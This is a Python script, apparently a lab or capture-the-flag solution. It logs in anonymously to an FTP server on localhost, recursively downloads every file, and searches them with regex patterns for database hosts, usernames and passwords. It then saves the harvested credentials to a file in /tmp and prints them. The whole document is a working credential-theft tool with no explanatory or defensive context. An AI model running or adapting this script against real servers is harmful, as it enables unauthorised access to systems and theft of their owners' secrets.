#!/usr/bin/env python3

import os
import re
from ftplib import FTP

def connect_to_ftp():
    """Connect to the FTP server anonymously"""
    ftp = FTP()
    ftp.connect('localhost', 2121)
    ftp.login('anonymous', 'anonymous@')
    return ftp

def explore_ftp(ftp, path=''):
    """Recursively explore FTP directory structure"""
    files = []
    try:
        items = []
        ftp.dir(path, items.append)
        
        for item in items:
            parts = item.split()
            if len(parts) < 9:
                continue
            
            filename = ' '.join(parts[8:])
            full_path = f"{path}/{filename}" if path else filename
            
            if item.startswith('d'):
                files.extend(explore_ftp(ftp, full_path))
            else:
                files.append(full_path)
    except Exception as e:
        pass
    
    return files

def download_file(ftp, remote_path, local_path):
    """Download a file from FTP server"""
    try:
        with open(local_path, 'wb') as f:
            ftp.retrbinary(f'RETR {remote_path}', f.write)
        return True
    except Exception as e:
        return False

def extract_credentials_from_file(filepath):
    """Extract database credentials from a file"""
    creds = {'host': 'UNKNOWN', 'user': 'UNKNOWN', 'password': 'UNKNOWN'}
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Try various patterns for credentials
            host_patterns = [
                r'["\']?host["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'DB_HOST\s*=\s*["\']([^"\']+)["\']',
                r'database_host\s*=\s*["\']([^"\']+)["\']',
            ]
            
            user_patterns = [
                r'["\']?user["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'DB_USER\s*=\s*["\']([^"\']+)["\']',
                r'username\s*=\s*["\']([^"\']+)["\']',
            ]
            
            password_patterns = [
                r'["\']?password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                r'DB_PASSWORD\s*=\s*["\']([^"\']+)["\']',
                r'passwd\s*=\s*["\']([^"\']+)["\']',
            ]
            
            for pattern in host_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    creds['host'] = match.group(1)
                    break
            
            for pattern in user_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    creds['user'] = match.group(1)
                    break
            
            for pattern in password_patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    creds['password'] = match.group(1)
                    break
    
    except Exception as e:
        pass
    
    return creds

def main():
    print("[*] Connecting to FTP server at localhost:2121...")
    ftp = connect_to_ftp()
    print("[+] Connected successfully!")
    
    print("[*] Exploring FTP directory structure...")
    files = explore_ftp(ftp)
    print(f"[+] Found {len(files)} files")
    
    temp_dir = '/tmp/ftp_downloads'
    os.makedirs(temp_dir, exist_ok=True)
    
    credentials = {'host': 'UNKNOWN', 'user': 'UNKNOWN', 'password': 'UNKNOWN'}
    
    print("[*] Downloading and analyzing files...")
    for remote_file in files:
        local_file = os.path.join(temp_dir, os.path.basename(remote_file))
        print(f"[*] Downloading {remote_file}...")
        
        if download_file(ftp, remote_file, local_file):
            creds = extract_credentials_from_file(local_file)
            
            if creds['host'] != 'UNKNOWN':
                credentials['host'] = creds['host']
            if creds['user'] != 'UNKNOWN':
                credentials['user'] = creds['user']
            if creds['password'] != 'UNKNOWN':
                credentials['password'] = creds['password']
            
            if all(v != 'UNKNOWN' for v in credentials.values()):
                print("[+] All credentials found!")
                break
    
    ftp.quit()
    
    output_file = '/tmp/extracted_creds.txt'
    with open(output_file, 'w') as f:
        f.write(f"host={credentials['host']}\n")
        f.write(f"user={credentials['user']}\n")
        f.write(f"password={credentials['password']}\n")
    
    print(f"[+] Credentials saved to {output_file}")
    print(f"[*] Host: {credentials['host']}")
    print(f"[*] User: {credentials['user']}")
    print(f"[*] Password: {credentials['password']}")

if __name__ == '__main__':
    main()